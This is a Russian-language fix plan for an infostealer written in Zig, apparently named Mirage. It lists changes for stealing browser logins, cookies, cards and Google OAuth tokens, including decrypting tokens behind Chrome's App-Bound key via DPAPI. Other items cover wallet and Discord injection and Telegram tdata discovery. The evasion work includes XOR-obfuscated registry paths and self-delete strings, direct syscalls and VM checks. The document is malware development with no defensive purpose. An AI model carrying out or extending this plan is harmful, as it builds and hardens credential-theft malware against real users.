# Audit Fix Plan — Critical + Warning Issues

**Цель:** Исправить 6 критических (C1-C6) и 6 важных (W1-W6) проблем, найденных в аудите.
**Оценка:** ~3 дня

---

## 🔴 C1: 1MB Stack Allocation (main.zig:383)

**Проблема:** `var enc_buf: [1024 * 1024]u8 = undefined;` — 1MB на стеке. Windows stack = 1MB по умолчанию.

**Решение:** Заменить stack buffer на heap allocation через NtAllocateVirtualMemory.

**Файл:** `src/main.zig`
- Заменить `var enc_buf: [1024 * 1024]u8 = undefined;` на:
```zig
var enc_base: ?types.PVOID = null;
var enc_size: types.SIZE_T = 1024 * 1024;
if (engine.NtAllocateVirtualMemory(
    @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
    @as(*types.PVOID, @ptrCast(&enc_base)),
    0, &enc_size,
    types.MEM_COMMIT | types.MEM_RESERVE,
    types.PAGE_READWRITE,
) < 0 or enc_base == null) return;
defer {
    var free_base: ?types.PVOID = enc_base;
    var free_size: types.SIZE_T = 0;
    _ = engine.NtFreeVirtualMemory(
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        @as(*types.PVOID, @ptrCast(&free_base)),
        &free_size, types.MEM_RELEASE,
    );
};
const enc_buf = @as([*]u8, @ptrCast(@alignCast(enc_base.?)))[0..1024*1024];
```

---

## 🔴 C2: Plaintext Registry Paths (hardware.zig, network_info.zig, os_info.zig)

**Проблема:** 7 registry paths в plaintext.

**Решение:** Перенести все registry paths в `const E = struct { ... }` с XOR-encrypt.

**Файлы и строки:**

### hardware.zig
- Line 109: `const base_path = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}";`
- Line 184: `const base_path = "\\Registry\\Machine\\HARDWARE\\DESCRIPTION\\System\\BIOS";`
- Move to E struct via hash.xorEncrypt, decrypt at runtime.

### network_info.zig
- Lines 90, 123, 141, 155: registry paths
- Move to E struct.

### os_info.zig
- Line 80: `"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"`
- Move to E struct.

**Паттерн:**
```zig
const E = struct {
    pub const reg_path = hash.xorEncrypt("\\Registry\\Machine\\...");
};
// Usage:
var buf: [E.reg_path.len]u8 = undefined;
hash.xorDecrypt(&E.reg_path, &buf);
const path = buf[0..];
```

---

## 🔴 C3: Duplicate Browser Entries (chromium_paths.zig)

**Проблема:** В массиве 70 элементов, но indices 58-69 — дубликаты indices 17-29.

**Решение:** Убрать дубликаты, оставить 55 уникальных Chromium браузеров. Исправить тест в main.zig (сейчас проверяет `== 36`).

**Файл:** `src/browsers/chromium_paths.zig`
- Удалить entries 58-69 (дубликаты)
- Сменить все `[70]` на `[56]` (или сколько останется после чистки)
- Обновить `_chromium_browsers: [56]BrowserInfo`
- Обновить `inline for (0..56)`
- Обновить буферы (NAMES/PATHS)

**Файл:** `src/main.zig`
- Найти строку `assert(browsers.len == 36, "36 chromium browsers configured");`
- Поменять `36` на актуальное количество после чистки

---

## 🔴 C4: Wallet Inject — Wrong Path + Missing Logic (wallet_inject.zig)

**Проблемы:**
1. Atomic wallet path: `%LOCALAPPDATA%\atomic\` — неверно. Должно быть `%LOCALAPPDATA%\Programs\atomic\resources\app.asar`
2. Нет фактической инжекции — только проверка существования путей.

**Решение:**
- Исправить Atomic path
- Переименовать функцию — это `detect`, не `inject`
- Добавить TODO-комментарий для будущей имплементации инжекции

---

## 🔴 C5: NtQuerySystemInformation Without Retry (process_list.zig, processes.zig)

**Проблема:** 256KB буфер один раз, без retry при STATUS_INFO_LENGTH_MISMATCH.

**Решение:** Добавить цикл с удвоением буфера при ошибке.

**Паттерн:**
```zig
var buf_size: usize = 256 * 1024;
while (true) {
    // allocate buf_size
    const status = engine.NtQuerySystemInformation(5, base.?, ..., &ret_len);
    if (status == 0x80000005) { // STATUS_INFO_LENGTH_MISMATCH
        buf_size *= 2;
        // free and re-allocate
        continue;
    }
    if (status < 0) return ...;
    break;
}
```

**Файлы:** `src/evasion/process_list.zig`, `src/system/processes.zig`

---

## 🔴 C6: Google OAuth Without App-Bound Support (google_tokens.zig)

**Проблема:** Токены на Chrome 112+ зашифрованы App-Bound ключом. Mirage пытается расшифровать как старый AES-GCM → неудача.

**Решение:** Добавить app_bound_encrypted_key проверку. Если в Local State есть `"app_bound_encrypted_key"`, использовать `chrome_crypto.decryptEncryptedKey` для расшифровки (через DPAPI), затем AES-GCM decrypt.

**Файл:** `src/browsers/google_tokens.zig`

---

## 🟡 W1: Duplicate columnIndex (5× копипаста)

**Проблема:** `columnIndex` функция определена в chromium_login.zig, cookies.zig, cards.zig, history.zig, autofill.zig.

**Решение:** Вынести в `parsers/sqLoot.zig` как публичную функцию, импортировать везде.

---

## 🟡 W2: Duplicate regex_grabber Call (system_info.zig)

**Проблема:** `regex_grabber.scanFiles` вызывается дважды в report generation.

**Решение:** Убрать второй вызов.

**Файл:** `src/system/system_info.zig`

---

## 🟡 W3: Telegram Mods — Process Discovery

**Проблема:** Только 7 путей, нет сканирования по процессам.

**Решение:** Добавить process-based discovery в `telegram_mods.zig`:
1. NtQuerySystemInformation → список процессов
2. Проверить имена: Telegram, AyuGram, 64Gram, Catogram, Nekogram, Kotatogram, Forkgram, Unigram, iMe
3. Для каждого найденного: `GetModuleFileNameEx` → извлечь путь → директория → tdata

---

## 🟡 W4: BetterDiscord Bypass — CodePage437

**Проблема:** Миражевский bypass делает прямую замену строк. BetterDiscord asar использует CodePage437 encoding.

**Решение:** Добавить CP437 → UTF-8 → Replace → CP437 конвертацию.

---

## 🟡 W5: 20 Files With Zero Tests

**Проблема:** `engine.zig` (556 строк), `evasion.zig`, `types.zig` и 17 других файлов без тестов.

**Решение:** Добавить 1-2 теста на файл (хотя бы проверка структур/констант).
- engine.zig: тест что SSNы не-null (уже есть косвенно в main.zig debug tests)
- evasion.zig: тест rdtsc, test checkRegistryVmIndicators
- types.zig: тест размеров структур
- stubs.zig: тест что ассемблерные заглушки компилируются
- gadget.zig: тест что gadget pool не пуст

---

## 🟡 W6: Plaintext Batch Strings (self_delete.zig)

**Проблема:** `@echo off`, `del /F /Q`, `timeout /t 2` и т.д. в plaintext.

**Решение:** Переместить все строки batch в `const E = struct { ... }` с XOR-encrypt.

---

## Execution Order

```
День 1: Баги (C2, C3, C4, C6)
  ├─ C2: XOR-encrypt registry paths (3 файла)
  ├─ C3: Удалить дубликаты chromium_paths.zig
  ├─ C4: Исправить wallet_inject.zig
  └─ C6: Добавить App-Bound support в google_tokens.zig

День 2: Баги (C1, C5) + W1, W2
  ├─ C1: Heap allocation в main.zig
  ├─ C5: Retry loop в process_list.zig + processes.zig
  ├─ W1: Вынести columnIndex в sqLoot.zig
  └─ W2: Убрать duplicate regex_grabber

День 3: Warning (W3, W4, W5, W6)
  ├─ W3: Process discovery в telegram_mods.zig
  ├─ W4: CP437 conversion в discord_inject.zig
  ├─ W5: Добавить тесты в 5+ файлов
  └─ W6: XOR-encrypt batch strings в self_delete.zig
```

## Files Changed (Summary)

| File | Fix | Type |
|------|-----|------|
| `src/main.zig` | C1: heap alloc + C3: browser count test | ✏️ |
| `src/browsers/chromium_paths.zig` | C3: remove duplicates | ✏️ |
| `src/browsers/wallet_inject.zig` | C4: fix Atomic path, rename func | ✏️ |
| `src/browsers/google_tokens.zig` | C6: add App-Bound support | ✏️ |
| `src/evasion/process_list.zig` | C5: add retry loop | ✏️ |
| `src/system/processes.zig` | C5: add retry loop | ✏️ |
| `src/system/hardware.zig` | C2: XOR-encrypt paths | ✏️ |
| `src/system/network_info.zig` | C2: XOR-encrypt paths | ✏️ |
| `src/system/os_info.zig` | C2: XOR-encrypt path | ✏️ |
| `src/parsers/sqLoot.zig` | W1: add columnIndex | ✏️ |
| `src/browsers/chromium_login.zig` | W1: import columnIndex | ✏️ |
| `src/browsers/chromium_cookies.zig` | W1: import columnIndex | ✏️ |
| `src/browsers/chromium_cards.zig` | W1: import columnIndex | ✏️ |
| `src/browsers/chromium_history.zig` | W1: import columnIndex | ✏️ |
| `src/browsers/chromium_autofill.zig` | W1: import columnIndex | ✏️ |
| `src/system/system_info.zig` | W2: remove duplicate call | ✏️ |
| `src/messengers/telegram_mods.zig` | W3: add process discovery | ✏️ |
| `src/messengers/discord_inject.zig` | W4: add CP437 conversion | ✏️ |
| `src/cleanup/self_delete.zig` | W6: XOR-encrypt batch strings | ✏️ |
| `src/evasion/evasion.zig` | W5: add tests | ✏️ |
| `src/syscalls/engine.zig` | W5: add tests | ✏️ |
| `src/types/types.zig` | W5: add tests | ✏️ |
